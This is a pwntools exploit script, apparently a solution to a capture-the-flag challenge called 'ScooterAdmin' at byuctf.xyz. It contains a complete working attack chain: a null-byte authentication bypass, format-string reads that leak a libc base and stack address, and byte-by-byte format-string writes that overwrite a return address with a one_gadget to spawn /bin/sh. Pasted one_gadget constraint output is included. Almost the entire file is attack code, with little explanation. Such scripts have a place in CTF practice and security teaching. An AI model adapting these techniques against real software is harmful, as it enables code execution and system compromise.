from pwn import *


# initialize the binary
binary = "./ScooterAdmin"
elf = context.binary = ELF(binary, checksec=False,)
libc = ELF("./libc.so.6", checksec=False,)

gs = """
break main
continue
"""

if args.REMOTE:
    p = remote("byuctf.xyz", 40012)
elif args.GDB:
    p = gdb.debug(binary, gdbscript=gs, env={"LD_PRELOAD": libc.path})
else:
    p = elf.process(env={"LD_PRELOAD": libc.path})

# bypass auth
p.send(b"\x00" * 51)
p.recvuntil(b'Enter choice: ')


"""
one_gadget output for libc:
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
"""

# leak libc base from a pointer saved on the stack
p.sendline(b'3')
p.sendline(b'----%785$p----')

p.recvline()
out = p.recvline().decode().split('----')[1]
offset = 0x751CD    # calculated from libc base in /proc/xx/maps

libc_base = int(out, 16) - offset
print("Libc base address -",hex(libc_base))

one_gadget = libc_base + 0x50a37 # other 3 one_gadgets don't work, this one does!!
print("One gadget address -",hex(one_gadget))

p.recvuntil(b'Enter choice: ')


# leak frame pointer based off stack pointer
p.sendline(b'3')
p.sendline(b'----%780$p----')

p.recvline()
out = p.recvline().decode().split('----')[1]
offset = 0x2298

frame_pointer = int(out, 16) + offset
print("Frame pointer address -",hex(frame_pointer))

p.recvuntil(b'Enter choice: ')


# write one_gadget to frame pointer byte by byte
print("[+] Getting shell...")
for i in range(0,6):
    payload = fmtstr_payload(6, {frame_pointer+i : (one_gadget >> (i*8)) & 0xff}, write_size='byte')

    p.sendline(b'3')
    p.sendline(payload)

    p.recvuntil(b'Enter choice: ')

p.sendline(b'5')

p.interactive()